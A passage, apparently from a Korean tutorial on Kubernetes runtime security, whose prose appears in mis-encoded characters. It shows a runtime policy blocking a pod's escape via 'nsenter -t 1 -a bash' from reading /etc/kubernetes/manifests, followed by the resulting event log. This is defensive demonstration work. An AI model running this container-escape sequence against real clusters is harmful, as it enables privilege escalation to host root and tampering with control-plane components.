- ë‹¤ì‹œ íŒŒë“œì— ë“¤ì–´ê°€ì„œ í˜¸ìŠ¤íŠ¸ì˜ ë£¨íŠ¸ ê¶Œí•œìœ¼ë¡œ ìƒìŠ¹ ì‹œí‚¨ í›„ `/etc/kubernetes/manifests` í´ë”ì— ì ‘ê·¼í•˜ë©´ ì •ì±…ì„ í†µí•´ ì°¨ë‹¨ë˜ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤.

```bash
root@server:~# kubectl exec -it sith-infiltrator -- /bin/bash
root@kind-control-plane:/# nsenter -t 1 -a bash
root@kind-control-plane:/# cd /etc/kubernetes/manifests/
root@kind-control-plane:/etc/kubernetes/manifests# ls -la
ls: reading directory '.': Operation not permitted
total 0
```

- ë‹¤ì‹œ ì´ë²¤íŠ¸ ë¡œê·¸ ê²°ê³¼ë¥¼ ë³´ë©´ ls ëª…ë ¹ì˜ ì‹¤í–‰ ê²°ê³¼ status ê°’ì´ 2 ë¼ëŠ” ê²ƒì„ ë³¼ìˆ˜ ìˆë‹¤.
- ì£¼ë¡œ status ê°’ì´ 2ì¸ ê²½ìš°ëŠ” íŒŒì¼, ë””ë ‰í„°ë¦¬ë¥¼ ëª»ì°¾ì•—ê±°ë‚˜ ì ‘ê·¼ ê¶Œí•œì´ ì—†ì„ ë•Œ ë°œìƒí•œë‹¤.

```bash
ğŸš€ process default/sith-infiltrator /usr/bin/bash          ğŸ›‘ CAP_SYS_ADMIN
ğŸš€ process default/sith-infiltrator /usr/bin/ls -la        ğŸ›‘ CAP_SYS_ADMIN
ğŸ“š read    default/sith-infiltrator /usr/bin/ls /etc/kubernetes/manifests ğŸ›‘ CAP_SYS_ADMIN
ğŸ’¥ exit    default/sith-infiltrator /usr/bin/ls -la 2 ğŸ›‘ CAP_SYS_ADMIN
ğŸš€ process default/sith-infiltrator /bin/bash              ğŸ›‘ CAP_SYS_ADMIN
```